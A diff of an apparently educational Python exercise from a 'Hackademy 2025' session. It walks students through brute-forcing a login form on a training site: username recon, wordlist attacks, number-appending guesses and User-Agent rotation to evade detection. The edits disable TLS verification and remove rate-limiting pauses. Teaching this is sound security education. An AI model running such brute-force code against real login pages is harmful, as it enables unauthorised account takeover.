@@ -8,13 +8,13 @@ import time
 # --- Configuration ---
 # This is the URL of the live target website for the Fullwood Hackademy 2025 session.
 BASE_URL = "https://fullwoodhackademy2025.pro/"
-LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
+LOGIN_URL = BASE_URL + "login.php" 
 
 
 ## -- STEP 1: RECONNAISSANCE --
 ##
 ## This step is done manually!
-## Open your browser, go to https://fullwoodhackademy2025.pro/ and find the 'About Us' page.
+## Open your browser, go to https://fullwoodhackademy2025.pro/ and find Infomration about "target users".
 ## Choose a target and guess their username (e.g., their first name).
 ## You will use that username in the steps below.
 
@@ -26,7 +26,7 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 # print("--- [Step 2: GET Request] ---")
 # print(f"Fetching content from {LOGIN_URL}")
 # try:
-#     response = requests.get(LOGIN_URL)
+#     response = requests.get(LOGIN_URL, verify=False)
 #     print("Status Code:", response.status_code)
 #     if response.status_code == 200:
 #         print("Successfully connected to the live site.")
@@ -39,21 +39,25 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 
 
 ## -- STEP 3: Make a single POST request --
-##
+## 
+# # !!! TASK: Change variable 'username_you_found' from 'SomeUser' to the username you chose in Step 1 !!!
+# # !!! TASK: Change variable password_to_try from 'testpassword' to any password1 !!!
 ## Uncomment the code below to complete Step 3.
 ##
 # print("\n--- [Step 3: POST Request] ---")
-#
-# # !!! TASK: Change 'SomeUser' to the username you chose in Step 1 !!!
-# username_you_found = 'SomeUser'
-#
+
+
+# username_you_found = 'ella@example.com'
+# password_to_try = 'testpassword'
+
+
 # login_data = {
-#     'email': username_you_found + '@example.com', # The form might use 'email' instead of 'username'
-#     'password': 'testpassword'
+#     'email': username_you_found,
+#     'password': password_to_try
 # }
 # print(f"Attempting to log in as {login_data['email']} with password '{login_data['password']}'...")
 # try:
-#     response = requests.post(LOGIN_URL, data=login_data)
+#     response = requests.post(LOGIN_URL, data=login_data, verify=False)
 #     print("Response from server:")
 #     print(response.text)
 # except requests.exceptions.RequestException as e:
@@ -65,11 +69,11 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 ## Uncomment the code below to complete Step 4.
 ##
 # print("\n--- [Step 4: Brute-Force with File] ---")
-# password_file = "data/rockyou.txt"
-#
+# password_file = "data/mockyou.txt"
+
 # # !!! TASK: Change 'SomeUser' to the username you chose in Step 1 !!!
-# username_to_try = "SomeUser"
-#
+# username_to_try = "ella@example.com"
+
 # success = False
 # print(f"Starting brute-force on user '{username_to_try}' with file: {password_file}")
 # try:
@@ -77,21 +81,22 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 #         for password in f:
 #             password = password.strip()
 #             if not password: continue # Skip empty lines
-#
-#             login_data = {'email': username_to_try + '@example.com', 'password': password}
+
+#             login_data = {'email': username_to_try, 'password': password}
 #             print(f"Trying password: {password}")
-#             response = requests.post(LOGIN_URL, data=login_data)
-#             if "Welcome" in response.text or "Dashboard" in response.text:
+#             response = requests.post(LOGIN_URL, data=login_data, verify=False)
+#             # print(response.status_code)
+#             if "Welcome" in response.text or "Dashboard" in response.text or response.status_code!=401:
 #                 print(f"\n>>> Success! Login successful for {username_to_try} with password '{password}'")
 #                 success = True
 #                 break
-#             time.sleep(0.5) # Be polite to the live server!
-#
+#             # time.sleep(0.5) # Be polite to the live server!
+
 # except FileNotFoundError:
 #     print(f"Error: The password file '{password_file}' was not found.")
 # except requests.exceptions.RequestException as e:
 #     print(f"An error occurred during the attack: {e}")
-#
+
 # if not success:
 #     print(f"\nFile-based brute-force failed. No correct password found in the list.")
 
@@ -101,11 +106,11 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 ## Uncomment the code below to complete Step 5.
 ##
 # print("\n--- [Step 5: Enhanced Brute-Force] ---")
-# password_file = "rockyou.txt"
-#
+# password_file = "data\mockyou.txt"
+
 # # !!! TASK: Change 'SomeUser' to the username you chose in Step 1 !!!
-# username_to_try = "SomeUser"
-#
+# username_to_try = "ella@example.com"
+
 # success = False
 # print(f"Starting enhanced brute-force on '{username_to_try}' (file + appending numbers)...")
 # try:
@@ -113,12 +118,12 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 #         for password in f:
 #             password = password.strip()
 #             if not password: continue
-#
-#             for i in range(100, 1000):
+
+#             for i in range(0, 20):  # range of numbers to append
 #                 current_guess = password + str(i)
 #                 print(f"Trying: {current_guess}", end='\r')
-#                 login_data = {'email': username_to_try + '@example.com', 'password': current_guess}
-#                 response = requests.post(LOGIN_URL, data=login_data)
+#                 login_data = {'email': username_to_try, 'password': current_guess}
+#                 response = requests.post(LOGIN_URL, data=login_data, verify=False)
 #                 if "Welcome" in response.text or "Dashboard" in response.text:
 #                     print("\n" + "="*40)
 #                     print(f">>> Success! Found password for {username_to_try}: '{current_guess}'")
@@ -127,13 +132,13 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 #                     break
 #             if success:
 #                 break
-#             time.sleep(0.2) # A small pause between base passwords
-#
+#             time.sleep(0.1) # A small pause between base passwords
+
 # except FileNotFoundError:
 #     print(f"Error: The password file '{password_file}' was not found.")
 # except requests.exceptions.RequestException as e:
 #     print(f"An error occurred during the attack: {e}")
-#
+
 # if not success:
 #     print("\nEnhanced brute-force failed. The password must be even more complex!")
 
@@ -150,14 +155,14 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 # discovered_password = "password123"
 # username_to_try = "SomeUser"
 #
-# login_data = {'email': username_to_try + '@example.com', 'password': discovered_password}
+# login_data = {'email': username_to_try, 'password': discovered_password}
 #
 # print("Testing final login with User-Agent rotation...")
 # for i in range(5):
 #     headers = {'User-Agent': random.choice(USER_AGENTS)}
 #     print(f"Attempting login with User-Agent: {headers['User-Agent'][:50]}...")
 #     try:
-#         response = requests.post(LOGIN_URL, data=login_data, headers=headers)
+#         response = requests.post(LOGIN_URL, data=login_data, headers=headers, verify=False)
 #         if "Welcome" in response.text or "Dashboard" in response.text:
 #             print("   ...Success!")
 #         else:
@@ -167,4 +172,4 @@ LOGIN_URL = BASE_URL + "login.php" # Assuming the login form posts to login.php
 #         print(f"An error occurred: {e}")
 #         break
 
-print("\nAll steps complete. Feel free to experiment further!")
+print("\n Step complete. Feel free to experiment further!")
